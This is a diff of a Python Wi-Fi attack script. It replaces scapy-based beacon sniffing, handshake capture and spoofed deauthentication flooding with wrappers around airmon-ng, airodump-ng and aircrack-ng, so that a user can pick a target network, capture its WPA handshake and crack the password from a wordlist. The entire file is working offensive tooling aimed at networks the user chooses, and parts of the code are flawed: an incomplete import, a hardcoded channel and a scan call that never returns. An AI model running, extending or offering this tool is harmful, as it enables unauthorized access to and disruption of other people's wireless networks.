@@ -15,9 +15,7 @@
 import subprocess
 import sys
 import time
-from pyric import pyw
-from pyric.exceptions import PyRICError
-from scapy.all import
+import os
 
 # Banner
 def display_splash_screen():
@@ -54,6 +52,8 @@ def display_splash_screen():
     print(splash)
     print("Wifi Attack Tool 41PH4-01\n")
 
+
+# Function to check if a command is available on the system
 def check_tool_installed(tool_name):
     try:
         result = subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -64,95 +64,104 @@ def check_tool_installed(tool_name):
         print(f"{tool_name} is not installed. Please install it and run the script again.")
         sys.exit(1)
 
-def set_monitor_mode(interface):
+# Function to detect available network interfaces
+def get_network_interfaces():
     try:
-        if pyw.modeget(interface) != 'monitor':
-            pyw.down(interface)
-            pyw.modeset(interface, 'monitor')
-            pyw.up(interface)
-            print(f"Interface {interface} set to monitor mode.")
-        else:
-            print(f"Interface {interface} is already in monitor mode.")
-    except PyRICError as e:
-        print(f"Error setting interface to monitor mode: {e}")
+        result = subprocess.run(["ip", "link"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        interfaces = result.stdout.decode().splitlines()
+        interfaces = [line.split(":")[1].strip() for line in interfaces if "wlan" in line or "eth" in line]
+        if not interfaces:
+            raise ValueError("No network interfaces found.")
+        return interfaces
+    except Exception as e:
+        print(f"Error detecting network interfaces: {e}")
         sys.exit(1)
 
-def scan_networks(interface):
-    networks = {}
-    def packet_handler(pkt):
-        if pkt.haslayer(Dot11Beacon):
-            bssid = pkt[Dot11].addr2
-            ssid = pkt[Dot11Elt].info.decode()
-            if bssid not in networks:
-                networks[bssid] = ssid
-                print(f"Found Network: BSSID: {bssid}, SSID: {ssid}")
-    
-    print("Scanning for networks. Press Ctrl+C to stop.")
+# Function to enable monitor mode on the specified interface
+def enable_monitor_mode(interface):
     try:
-        sniff(iface=interface, prn=packet_handler, timeout=30)
-    except Exception as e:
-        print(f"Error scanning networks: {e}")
-    
-    return networks
+        print(f"Enabling monitor mode on {interface}...")
+        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
+        print(f"{interface} set to monitor mode.")
+    except subprocess.CalledProcessError:
+        print(f"Failed to set {interface} to monitor mode.")
+        sys.exit(1)
 
-def capture_handshake(interface, bssid):
-    print(f"Capturing handshake for BSSID: {bssid}")
+# Function to scan for networks
+def scan_networks(interface):
     try:
-        proc = subprocess.Popen(["tcpdump", "-i", interface, "-w", "handshake-01.cap", "ether host", bssid], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return proc
+        print(f"Scanning for networks on {interface}...")
+        networks = subprocess.check_output(["sudo", "airodump-ng", interface], stderr=subprocess.PIPE).decode()
+        print(networks)  # Optionally, you can parse this output to display SSIDs and BSSIDs more cleanly.
+    except subprocess.CalledProcessError as e:
+        print(f"Error scanning networks: {e}")
+        sys.exit(1)
+
+# Function to capture WPA handshake
+def capture_handshake(interface, target_bssid, output_file):
+    try:
+        print(f"Capturing WPA handshake for BSSID {target_bssid}...")
+        subprocess.run(["sudo", "airodump-ng", "--bssid", target_bssid, "-c", "6", "-w", output_file, interface], check=True)
+        print(f"Handshake captured and saved to {output_file}.")
     except subprocess.CalledProcessError as e:
         print(f"Error capturing handshake: {e}")
-        return None
+        sys.exit(1)
 
-def deauthenticate_clients(interface, bssid, source_mac):
-    print(f"Deauthenticating clients connected to BSSID: {bssid} with spoofed source MAC: {source_mac}")
-    deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=source_mac, addr3=bssid)/Dot11Deauth(reason=7)
+# Function to crack WPA handshake using aircrack-ng
+def crack_handshake(handshake_file, wordlist):
     try:
-        sendp(deauth_pkt, iface=interface, count=100, inter=0.1)
-        print("Deauthentication packets sent.")
-    except Exception as e:
-        print(f"Error deauthenticating clients: {e}")
-
-def crack_handshake(wordlist):
-    print(f"Cracking handshake using wordlist: {wordlist}")
-    try:
-        subprocess.run(["aircrack-ng", "-w", wordlist, "handshake-01.cap"], check=True)
+        print(f"Cracking WPA handshake with wordlist {wordlist}...")
+        result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, handshake_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = result.stdout.decode()
+        if "KEY FOUND" in output:
+            print(f"Password found: {output.splitlines()[-1]}")
+        else:
+            print("Failed to crack the password.")
     except subprocess.CalledProcessError as e:
         print(f"Error cracking handshake: {e}")
+        sys.exit(1)
 
+# Main function to tie everything together
 def main():
-    display_splash_screen()
-    check_tool_installed("tcpdump")
+    # Check for required tools
+    check_tool_installed("airmon-ng")
+    check_tool_installed("airodump-ng")
     check_tool_installed("aircrack-ng")
-
-    interface = input("Enter your wireless interface (e.g., wlan0): ")
     
-    set_monitor_mode(interface)
+    # Detect available network interfaces
+    interfaces = get_network_interfaces()
+    print("Available interfaces:")
+    for idx, iface in enumerate(interfaces):
+        print(f"{idx + 1}. {iface}")
     
-    networks = scan_networks(interface)
-    if networks:
-        for i, (bssid, ssid) in enumerate(networks.items(), 1):
-            print(f"{i}. BSSID: {bssid}, SSID: {ssid}")
-        selection = input("Select the network by number: ")
-        try:
-            selection = int(selection) - 1
-            bssid = list(networks.keys())[selection]
-            print(f"Selected BSSID: {bssid}")
-
-            handshake_process = capture_handshake(interface, bssid)
-            if handshake_process:
-                source_mac = RandMAC()  # Generate a random MAC address
-                deauthenticate_clients(interface, bssid, source_mac)
-                time.sleep(30)  # Wait for handshake to be captured
-                handshake_process.terminate()  # Stop tcpdump process
-
-                wordlist = input("Enter the path to your wordlist: ")
-                crack_handshake(wordlist)
+    # Ask user to choose interface
+    selection = input("Select the network interface to use (number): ")
+    try:
+        selected_iface = interfaces[int(selection) - 1]
+        print(f"Selected interface: {selected_iface}")
+    except (ValueError, IndexError):
+        print("Invalid selection, exiting.")
+        sys.exit(1)
     
-        except (ValueError, IndexError) as e:
-            print(f"Invalid selection: {e}")
-    else:
-        print("No networks found.")
+    # Enable monitor mode
+    enable_monitor_mode(selected_iface)
+    
+    # Scan for networks
+    scan_networks(selected_iface)
+    
+    # Ask user for target BSSID (Network MAC address)
+    target_bssid = input("Enter the BSSID (Network MAC address) of the target network: ")
+    # Set output file for capturing handshake
+    output_file = "/tmp/capture"
+    
+    # Capture WPA handshake
+    capture_handshake(selected_iface, target_bssid, output_file)
+    
+    # Ask for wordlist location
+    wordlist = input("Enter the path to your wordlist: ")
+    
+    # Crack WPA handshake
+    crack_handshake(f"{output_file}-01.cap", wordlist)
 
 if __name__ == "__main__":
     main()
